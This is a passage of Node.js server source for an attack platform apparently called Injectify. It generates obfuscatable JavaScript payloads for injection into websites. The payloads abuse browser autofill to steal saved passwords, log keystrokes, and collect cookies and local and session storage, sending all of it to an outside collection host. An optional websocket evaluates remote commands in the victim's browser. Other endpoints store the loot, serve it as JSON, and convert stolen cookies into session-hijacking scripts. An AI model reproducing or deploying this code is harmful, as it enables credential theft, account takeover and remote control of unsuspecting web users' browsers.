        let password = 'c'
        let keys = 'c'
        let url = 'd'
        let width = 'e'
        let height = 'f'
        let localStorage = 'g'
        let sessionStorage = 'h'
        let cookies = 'i'
        let title = 'j'
        if (record[project]) {
          db.collection('projects', (err, projects) => {
            if (err) throw err
            projects.findOne({name: record[project]}).then(doc => {
              if (doc !== null) {
                if (req.header('Referer') && doc.config.filter.domains.length > 0) {
                  let referer = new URL(req.header('Referer'))
                  let allowed = true
                  if (doc.config.filter.type.toLowerCase() === 'whitelist') allowed = false
                  doc.config.filter.domains.forEach(domain => {
                    if (domain.enabled === false) return
                    try {
                      domain = new URL(domain.match)
                    } catch (e) {
                      return
                    }
                    if (doc.config.filter.type.toLowerCase() === 'whitelist') {
                      // Whitelist
                      if (domain.host === referer.host) allowed = true
                    } else {
                      // Blacklist
                      if (domain.host === referer.host) allowed = false
                    }
                  })
                  if (!allowed) {
                    if (doc.config.filter.type.toLowerCase() === 'whitelist') {
                      reject("domain hasn't been whitelisted, not recording")
                    } else {
                      reject('domain has been blacklisted, not recording')
                    }
                    return
                  }
                }
                var ip
                try {
                  ip = headers['x-forwarded-for'].split(',')[0]
                } catch (e) {
                  ip = getIP(req.connection.remoteAddress)
                }
                request({
                  url: 'http://ip-api.com/json/' + ip,
                  method: 'GET',
                  headers: {
                    'Accept': 'application/json'
                  }
                }, (error, response, parsedIP) => {
                  if (error) throw error
                  try {
                    ip = JSON.parse(parsedIP)
                  } catch (e) {

                  }
                  if (record[type] === 0) {
                    // Password logger
                    var c = {}
                    try {
                      if (record[cookies]) {
                        var pairs = record[cookies].split(';')
                        for (var i = 0; i < pairs.length; i++) {
                          var pair = pairs[i].split('=')
                          c[pair[0]] = unescape(pair[1])
                        }
                      } else {
                        c = record[cookies]
                      }
                    } catch (e) {
                      // throw(e)
                      c = record[cookies]
                    }
                    projects.updateOne({
                      name: record[project]
                    },
                      {
                        $push: {
                          passwords: {
                            timestamp: new Date(),
                            username: record[username],
                            password: record[password],
                            url: {
                              title: record[title],
                              href: record[url]
                            },
                            ip: ip,
                            browser: {
                              width: record[width],
                              height: record[height],
                              'user-agent': parseAgent(headers['user-agent']),
                              headers: me(headers)
                            },
                            storage: {
                              local: me(record[localStorage]),
                              session: me(record[sessionStorage]),
                              cookies: me(c)
                            }
                          }
                        }
                      }).then(() => {
                        if (config.debug) {
                          console.log(
                        chalk.greenBright('[Record] ') +
                        chalk.yellowBright('recorded login ') +
                        chalk.magentaBright(record[username]) +
                        chalk.yellowBright(':') +
                        chalk.magentaBright(record[password]) +
                        chalk.yellowBright(' for project ') +
                        chalk.cyanBright(record[project])
                      )
                        }
                        resolve('wrote record to database')
                      })
                  } else if (record[type] === 1) {
                    // Keylogger
                    let timestamp = new Date()
                    try {
                      timestamp = new Date(record[identifier])
                    } catch (e) {}
                    // If the length is greater than 10,
                    if (record[keys]) {
                      let keystrokes = []
                      try {
                        for (i = 0; i < record[keys].length; i++) {
                          let key = record[keys][i]
                          let keytype = 'keydown'
                          if (key.endsWith('_') && key.length !== 1) {
                            key = key.slice(0, -1)
                            keytype = 'keyup'
                          }
                          let keyname = key

                          if (keyname && keytype) {
                            keystrokes.push('[' + keytype + ' ' + keyname + ']')
                          } else {
                            reject('invalid keylogger keycode')
                            break
                          }
                        }
                      } catch (e) {
                        reject('failed to parse keylogger array')
                        throw e
                      }
                      projects.updateOne({
                        'name': record[project],
                        'keylogger.timestamp': timestamp
                      },
                        {
                          $pushAll: {
                            'keylogger.$.keys': keystrokes
                          }
                        }).then((e) => {
                          if (e.result.nModified === 0) {
                          // Add new keylogger record
                            projects.updateOne({
                              name: record[project]
                            },
                              {
                                $push: {
                                  keylogger: {
                                    timestamp: timestamp,
                                    ip: ip,
                                    url: {
                                      title: record[title],
                                      href: record[url]
                                    },
                                    browser: {
                                      headers: me(headers),
                                      'user-agent': parseAgent(headers['user-agent'])
                                    },
                                    keys: keystrokes
                                  }
                                }
                              }).then(() => {
                                resolve('wrote record to database')
                              })
                          } else {
                            resolve('wrote log to database')
                          }
                        })
                    } else {
                      reject('keylogger value(s) not specified')
                    }
                  } else {
                    reject('invalid / missing record type')
                  }
                })
              } else {
                reject('project ' + record[project] + " doesn't exist")
              }
            })
          })
        }
      })
    }
    let path
    if (req.path.slice(-1) === '$') {
      // CORS bypass option enabled
      path = req.path.substring(1).split(/\/(.+)?/, 2)[1].slice(0, -1)
      res.set('Content-Type', 'text/html')
      .send('<script>window.history.back()</script>')
    } else {
      path = req.path.substring(1).split(/\/(.+)?/, 2)[1]
      // Send a 1x1px gif
      let data = [
        0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00, 0x80, 0x00, 0x00, 0xFF, 0xFF, 0xFF,
        0x00, 0x00, 0x00, 0x21, 0xf9, 0x04, 0x04, 0x00, 0x00, 0x00, 0x00, 0x2c, 0x00, 0x00, 0x00, 0x00,
        0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x02, 0x44, 0x01, 0x00, 0x3b
      ]
      res
      .set('Content-Type', 'image/gif')
      .set('Content-Length', data.length)
      .status(200)
      .send(Buffer.from(data))
    }
    validate(path).then(record => {
      Record(record).then(message => {
        if (config.debug) {
          console.log(
          chalk.greenBright('[record] ') +
          chalk.yellowBright(message)
        )
        }
      }).catch(error => {
        if (config.debug) {
          console.log(
          chalk.redBright('[record] ') +
          chalk.yellowBright(error)
        )
        }
      })
    }).catch(error => {
      if (config.debug) console.log(chalk.redBright('[record] ') + chalk.yellowBright(error))
    })
  })

  app.get('/api/json/*', (req, res) => {
    var getAPI = (name, token) => {
      return new Promise((resolve, reject) => {
        request({
          url: 'https://api.github.com/user?access_token=' + encodeURIComponent(token),
          method: 'GET',
          headers: {
            'Accept': 'application/json',
            'User-Agent': 'Injectify'
          }
        }, (error, response, user) => {
          try {
            user = JSON.parse(user)
          } catch (e) {
            console.error(e)
            reject({
              title: 'Could not authenticate you',
              message: 'Failed to parse the GitHub user API response'
            })
          }
          if (!error && response.statusCode === 200 && user.login) {
            db.collection('projects', (err, projects) => {
              if (err) throw err
              if (user.id === 13242392) {
                projects.findOne({
                  'name': name
                }).then(doc => {
                  if (doc !== null) {
                    resolve({
                      json: doc,
                      user: user
                    })
                  } else {
                    reject({
                      title: 'Access denied',
                      message: 'Project ' + name + " doesn't exist!"
                    })
                  }
                })
              } else {
                projects.findOne({
                  $or: [
                    {'permissions.owners': user.id},
                    {'permissions.admins': user.id},
                    {'permissions.readonly': user.id}
                  ],
                  $and: [
                    {'name': name}
                  ]
                }).then(doc => {
                  if (doc !== null) {
                    resolve({
                      json: doc,
                      user: user
                    })
                  } else {
                    reject({
                      title: 'Access denied',
                      message: "You don't have permission to access project " + name
                    })
                  }
                })
              }
            })
          } else {
            reject({
              title: 'Could not authenticate you',
              message: 'GitHub API rejected token!'
            })
          }
        })
      })
    }

    let token = req.query.token
    let project = decodeURIComponent(req.path.substring(10))

    if (project && token) {
      getAPI(project, token).then(data => {
        let json = data.json
        let user = data.user
        res.setHeader('Content-Disposition', 'filename="Injectify project records [' + json.name + '].json"')
        if (typeof req.query.download === 'string') {
          res.setHeader('Content-Type', 'application/octet-stream')
        } else {
          res.setHeader('Content-Type', 'application/json')
        }
        if (json.passwords && json.keylogger) {
          json = {
            passwords: json.passwords,
            keylogger: json.keylogger
          }
          json = JSON.stringify(json, null, '    ')
          res.send(json)
          console.log(
            chalk.greenBright('[API/JSON] ') +
            chalk.yellowBright('delivered ') +
            chalk.magentaBright(project) +
            chalk.redBright(' (length=' + json.length + ') ') +
            chalk.yellowBright('to ') +
            chalk.magentaBright(user.login) +
            chalk.redBright(' (' + user.id + ') ')
          )
        } else {
          res.send(JSON.stringify({
            title: 'Database error',
            message: 'An internal error occured whilst handling your request'
          }, null, '    '))
        }
      }).catch(error => {
        res.setHeader('Content-Type', 'application/json')
        res.send(JSON.stringify(error, null, '    '))
      })
    } else if (token) {
      res.setHeader('Content-Type', 'application/json')
      res.send(JSON.stringify({
        title: 'Bad request',
        message: 'Specify a project name to return in request',
        format: 'https://injectify.samdd.me/api/json/PROJECT_NAME?token=' + token
      }, null, '    '))
    } else {
      res.setHeader('Content-Type', 'application/json')
      res.send(JSON.stringify({
        title: 'Bad request',
        message: 'Specify a token & project name to return in request',
        format: 'https://injectify.samdd.me/api/json/PROJECT_NAME?token=GITHUB_TOKEN'
      }, null, '    '))
    }
  })

  app.get('/api/spoof/*', (req, res) => {
    var getAPI = (name, index, token) => {
      return new Promise((resolve, reject) => {
        request({
          url: 'https://api.github.com/user?access_token=' + encodeURIComponent(token),
          method: 'GET',
          headers: {
            'Accept': 'application/json',
            'User-Agent': 'Injectify'
          }
        }, (error, response, user) => {
          try {
            user = JSON.parse(user)
          } catch (e) {
            console.error(e, user)
            reject({
              title: 'Could not authenticate you',
              message: 'Failed to parse the GitHub user API response'
            })
          }
          if (!error && response.statusCode === 200 && user.login) {
            db.collection('projects', (err, projects) => {
              if (err) throw err
              projects.findOne({
                $or: [
                  {'permissions.owners': user.id},
                  {'permissions.admins': user.id},
                  {'permissions.readonly': user.id}
                ],
                $and: [
                  {'name': name}
                ]
              }).then(doc => {
                if (doc !== null) {
                  let record = doc.passwords[index]
                  if (record) {
                    if (record.storage) {
                      let local = record.storage.local
                      let session = record.storage.session
                      let cookies = record.storage.cookies
                      let js = ''
                      let property
                      if (local) {
                        for (property in local) {
                          if (local.hasOwnProperty(property)) {
                            js +=
                            `localStorage.setItem('` + property.replace(/\\/g, '\\\\').replace(/'/g, "\\'") + `', '` + local[property].replace(/\\/g, '\\\\').replace(/'/g, "\\'") + `');\n`
                          }
                        }
                      }
                      if (session) {
                        for (property in session) {
                          if (session.hasOwnProperty(property)) {
                            js +=
                            `sessionStorage.setItem('` + property.replace(/\\/g, '\\\\').replace(/'/g, "\\'") + `', '` + session[property].replace(/\\/g, '\\\\').replace(/'/g, "\\'") + `');\n`
                          }
                        }
                      }
                      if (cookies) {
                        for (property in cookies) {
                          if (cookies.hasOwnProperty(property)) {
                            js +=
                            `document.cookie = '` + property.replace(/\\/g, '\\\\').replace(/'/g, "\\'") + `=` + cookies[property].replace(/\\/g, '\\\\').replace(/'/g, "\\'") + `';\n`
                          }
                        }
                      }
                      // let minified = UglifyJS.minify(js).code
                      // if (minified) js = minified
                      if (js) {
                        resolve({
                          js: js,
                          project: doc.name,
                          user: user
                        })
                      } else {
                        reject({
                          title: 'Nothing to generate',
                          message: "The requested record didn't contain any storage"
                        })
                      }
                    } else {
                      reject({
                        title: 'Database error',
                        message: 'An internal error occured whilst handling your request'
                      })
                    }
                  } else {
                    reject({
                      title: 'Nonexistent index',
                      message: 'The index ' + index + " doesn't exist for this project"
                    })
                  }
                } else {
                  reject({
                    title: 'Access denied',
                    message: "You don't have permission to access project " + name
                  })
                }
              })
            })
          } else {
            reject({
              title: 'Could not authenticate you',
              message: 'GitHub API rejected token!'
            })
          }
        })
      })
    }

    let token = req.query.token
    let index = req.query.index
    let project = decodeURIComponent(req.path.substring(11))

    if (project && token && index) {
      getAPI(project, index, token).then(data => {
        let js = data.js
        let project = data.project
        let user = data.user
        res.setHeader('Content-Disposition', 'filename="Injectify spoofer [' + project + '].js"')
        if (typeof req.query.download === 'string') {
          res.setHeader('Content-Type', 'application/octet-stream')
        } else {
          res.setHeader('Content-Type', 'application/javascript')
        }
        res.send(js)
        console.log(
          chalk.greenBright('[API/SPOOF] ') +
          chalk.yellowBright('delivered ') +
          chalk.magentaBright(project) +
          chalk.redBright(' (length=' + js.length + ') ') +
          chalk.yellowBright('to ') +
          chalk.magentaBright(user.login) +
          chalk.redBright(' (' + user.id + ') ')
        )
      }).catch(error => {
        res.setHeader('Content-Type', 'application/json')
        res.send(JSON.stringify(error, null, '    '))
      })
    } else {
      res.setHeader('Content-Type', 'application/json')
      res.send(JSON.stringify({
        title: 'Bad request',
        message: 'Specify a token, project name and index to return in request',
        format: 'https://injectify.samdd.me/api/spoof/PROJECT_NAME?index=INDEX&token=GITHUB_TOKEN'
      }, null, '    '))
    }
  })

  app.get('/api/payload/*', (req, res) => {
    function enc (string, enableEval) {
      if (req.query.base64 === 'false') {
        if (enableEval) {
          return string
        } else {
          return '"' + string + '"'
        }
      } else {
        if (enableEval) {
          return 'eval(atob("' + btoa(string) + '"))'
        } else {
          return 'atob("' + btoa(string) + '")'
        }
      }
    }
    function comment (message) {
      if (req.query.comments === 'true') {
        return '\n// ' + message
      } else {
        return ''
      }
    }
    function ifPassword (script) {
      if (req.query.passwords === 'false') {
        return ''
      } else {
        return script + '\n'
      }
    }
    function ifNotPassword (script) {
      if (req.query.passwords === 'false') {
        return script + '\n'
      } else {
        return ''
      }
    }
    function debug (script) {
      if (req.query.debug === 'true') {
        return '\n' + script
      } else {
        return ''
      }
    }
    function sendToServer (url) {
      if (config.dev) url = '"http:"+' + url
      if (bypassCors) {
        return 'window.location=' + url + '+"$"'
      } else {
        return enc('c.src=' + url, true)
      }
    }
    let valid = true
    if (!req.query.project) valid = false

    let inject = false
    if (req.query.inject === 'true') inject = true
    let keylogger = false
    if (req.query.keylogger === 'true') keylogger = true
    let screenSize = true
    if (req.query.screenSize === 'false') screenSize = false
    let location = true
    if (req.query.location === 'false') location = false
    let localStorage = true
    if (req.query.localStorage === 'false') localStorage = false
    let sessionStorage = true
    if (req.query.sessionStorage === 'false') sessionStorage = false
    let cookies = true
    if (req.query.cookies === 'false') cookies = false
    let bypassCors = false
    if (req.query.bypassCors === 'true') bypassCors = true

    let proxy = '//uder.ml/' // '//injectify.samdd.me/'
    if (req.query.proxy) proxy = req.query.proxy
    let wss = 'wss:'
    if (config.dev) {
      proxy = '//localhost:' + config.express + '/'
      wss = 'ws:'
    }

    let injectProject = btoa(req.query.project)
    if (req.query.debug === 'true') injectProject = '$' + injectProject
    let help = `
    // ┌─────────────────────────────────────┐
    // │     Injectify payload engine ©      │
    // │   INTELLECTUAL PROPERTY OF SAMDD    │
    // ├────────────────┬─────────┬──────────┤
    // │ GET_PARAM      │ TYPE    │ DEFAULT  │
    // ├────────────────┼─────────┼──────────┤
    // │ project        │ STRING  │ REQUIRED │
    // │ proxy          │ URL     │ NONE     │
    // │ base64         │ BOOLEAN │ TRUE     │
    // │ obfuscate      │ BOOLEAN │ FALSE    │
    // │ minify         │ BOOLEAN │ FALSE    │
    // │ comments       │ BOOLEAN │ FALSE    │
    // | debug          | BOOLEAN | FALSE    |
    // | bypassCors     | BOOLEAN | FALSE    |
    // │                │         │          │
    // | inject         │ BOOLEAN │ FALSE    |
    // | passwords      │ BOOLEAN │ TRUE     |
    // | keylogger      │ BOOLEAN │ FALSE    |
    // │ screenSize     │ BOOLEAN │ TRUE     │
    // │ location       │ BOOLEAN │ TRUE     │
    // │ localStorage   │ BOOLEAN │ TRUE     │
    // │ sessionStorage │ BOOLEAN │ TRUE     │
    // │ cookies        │ BOOLEAN │ TRUE     │
    // └────────────────┴─────────┴──────────┘`

    if (valid) {
      res.setHeader('Content-Type', 'application/javascript')

      let variables = ''
      let json = ''
      let body = ''
      let catcher = ''
      let injectScript

      if (inject) {
        let websocket = "'"+ wss + "'+p+'i/websocket?" + injectProject + "'"
        if (req.query.passwords === 'false' && keylogger === false) websocket = "'" + wss + proxy + "i/websocket?" + injectProject + "'"
        body += `
          function u() {` + comment('Open a new websocket to the server') + `
            window.ws = new WebSocket(` + websocket + `)
            ws.onmessage = function(d) {
                try {` + comment('Parse the websocket message as JSON') + `
                    d = JSON.parse(d.data)` + comment('Evaluate the javascript') + `
                    eval(d.d)
                } catch(e) {` + comment('On error send error back to server') + `
                    ws.send(JSON.stringify({
                        t: 'e',
                        d: e,
                    }))
                }
            }
            ws.onclose = function() {` + comment('Attempt to re-open the websocket, retrying every 3 seconds') + `
                setTimeout(u, 3000)
            }
          }
          u()
        `
        injectScript = body
      }
      if (keylogger) {
        variables += 'm = {}, f = [], g = new Date().getTime(),'
        body += comment('add listeners to the window for keydown & keyup events') + `
          k.onkeydown = k.onkeyup = function (n) {
            var l = '',` + comment('give the keycode number to variables h & z') + `
              h = n.key,
              z = h` + comment("if the key type ends with p => then it's keyup") + `
            if (n.type.slice(-1) == 'p') l = '_'` + comment('append the keyup / keydown indicator') + `
            z += l` + comment('ignore multiple modifier calls & invalid key presses') + `
            if (m == z || !h) return` + comment('Push to array') + `
            f.push(z)` + comment('update the value of the last m(odifier) key press') + `
            if (h.length > 1) m = z
            ` + debug(`
              if (n.key && n.key.length > 1) {
                console.log('%c[keylogger@INJECTIFY] %cModifier key state changed', 'color: #ef5350; font-weight: bold', 'color: #FF9800', n)
              } else {
                console.log('%c[keylogger@INJECTIFY] %cKey state changed', 'color: #ef5350; font-weight: bold', 'color: #FF9800', n)
              }
            `) + `
          }

          setInterval(function() {` + comment('if the array is empty, skip making a request') + `
            if (!f.length) return
            i = {
              a: atob("` + btoa(req.query.project) + `"),
              t: 1,
              b: g,
              c: f,
              d: k.location.href,
              j: d.title
            }
            ` + sendToServer("p+'r/'+btoa(encodeURI(JSON.stringify(i))).split('').reverse().join('')") + `
            f = []
          }, 3000)
        `
      }
      if (screenSize) {
        variables += 'j = k.screen,'
        json += 'e: j.height, f: j.width,'
      }
      if (location) json += 'd: k.location.href, j: d.title,'
      if (localStorage) catcher += 'i.g = localStorage,'
      if (sessionStorage) catcher += 'i.h = sessionStorage,'
      if (cookies) json += 'i: d.cookie,'

      if (variables) variables = ',' + variables.slice(0, -1)
      if (json) json = ',' + json.slice(0, -1)
      if (catcher) {
        if (req.query.debug === 'true') {
          catcher = '\n' + catcher.slice(0, -1)
        } else {
          catcher = '\ntry {' + comment('attempt to insert the local & session storage into object, but ignore if it fails\n') + catcher.slice(0, -1) + '} catch(error) {}\n\n'
        }
      }

      let script = help + `
      //  Project name    | ` + req.query.project + `


      ` + injectScript
      if (!(req.query.passwords == 'false' && keylogger == false)) {
        script = help + `
        //  Project name    | ` + req.query.project + `


        var d = document,` +
          ifPassword(`
            v = ` + enc('input') + `,
            w = d.createElement(` + enc('form') + `),
            x = d.createElement(v),
            y,`
          ) +
          `c = ` + enc('new Image()', true) + `,
          p = ` + enc(proxy) + `,
          i,
          k = window` + variables +

        ifPassword(`\n` +
          comment('name attribute is required for autofill to work') + `
          x.name = ""` +

          comment('autofill still works if the elements are non-rendered') + `
          x.style = ` + enc('display:none') + `
          ` +

          comment('clone the input node instead of declaring it again') + `
          y = x.cloneNode()` +

          comment('set the input type to password') + `
          y.type = ` + enc('password') + `
          ` +

          comment('append elements to form node') + `
          w.appendChild(x)
          w.appendChild(y)` +

          comment('append form node to DOM') + `
          d.body.appendChild(w)`
        ) + '\n' +

        body +

        ifPassword(
          comment("add a listener to the password input, browser's autofiller will trigger this") + `
          y.addEventListener(v, function () {` + comment('construct a global object with data to extract')
        ) + ifNotPassword(`\n`) +
          `i = {
            a: atob("` + btoa(req.query.project) + `"),
            t: 0` +
            ifPassword(`,
              b: x.value,
              c: y.value`
            ) + json + `
          }
          ` + catcher +
          ifPassword(debug("console.log('%c[INJECTIFY] %cCaptured username & password', 'color: #ef5350; font-weight: bold', 'color: #FF9800', i)\n")) +

          comment('send a request to the server (or proxy) with the BASE64 encoded JSON object\n') +
          sendToServer(`p+'r/'+btoa(encodeURI(JSON.stringify(i))).split('').reverse().join('')`) +
          ifPassword(
            comment("remove the form node from the DOM (so it can't be (easily) seen in devtools)") + `
            w.remove()
            })`
          )
        /// ////////////////////////////////////////////////////////////////////////
      }

      if (req.query.obfuscate === 'true') {
        ObfuscateJS(script, {

        }).then(obfuscated => {
          res.send(obfuscated)
        }, function (err) {
          res.send(UglifyJS.minify(script).code)
          throw err
        })
      } else if (req.query.minify === 'true') {
        res.send(
          UglifyJS.minify(script).code
        )
      } else {
        res.send(
          beautify(script, {
            indent_size: 2
          })
        )
      }
    } else {
      res.setHeader('Content-Type', 'application/javascript')
      let script = help
      res.send(
        beautify(script, {
          indent_size: 2
        })
      )
    }
    if (config.debug) {
      console.log(
      chalk.greenBright('[Payload] ') +
      chalk.yellowBright('generated for project ') +
      chalk.magentaBright(req.query.project)
    )
    }
  })

  if (config.dev) {
    app.use('/assets/main.css', (req, res) => {
      res.sendFile(path.join(__dirname, '/../../output/site/assets/main.css'))
    })
    // Proxy through to webpack-dev-server if in development mode
    app.use('/projects/*', (req, res) => {
      if (req.originalUrl.includes('.hot-update.js')) {
        let hotUpdate = req.originalUrl.split('/')
        hotUpdate = hotUpdate[hotUpdate.length - 1]
        request('http://localhost:8080/' + hotUpdate).pipe(res)
        return
      }
      if (req.originalUrl.includes('/vs/')) {
        let vs = req.originalUrl.split('/vs/')
        vs = vs[vs.length - 1]
        request('http://localhost:8080/vs/' + vs).pipe(res)
        return
      }
      request('http://localhost:8080' + req.originalUrl.substring(9), (error, response) => {
        if (error) throw error
        if (response.statusCode === 404) {
          request('http://localhost:8080/').pipe(res)
        } else {
          request('http://localhost:8080' + req.originalUrl.substring(9)).pipe(res)
        }
      })
    })
    app.use('/*', (req, res) => {
      if (req.url.substr(0, 9) === '/cdn-cgi/') return
      request('http://localhost:8080' + req.originalUrl).pipe(res)
    })
  } else {
    app.use('/projects/*', (req, res) => {
      if (req.originalUrl.includes('/vs/')) {
        let vs = req.originalUrl.split('/vs/')
        vs = '../../output/site/vs/' + path.normalize(vs[vs.length - 1])
        if (fs.existsSync(vs)) {
          res.sendFile(path.join(__dirname, vs))
        } else {
          res.status(404).send('Not found')
        }
      } else {
        res.sendFile(path.join(__dirname, '../../output/site/index.html'))
      }
    })
    app.use(express.static(path.join(__dirname, '../../output/site')))
  }
})
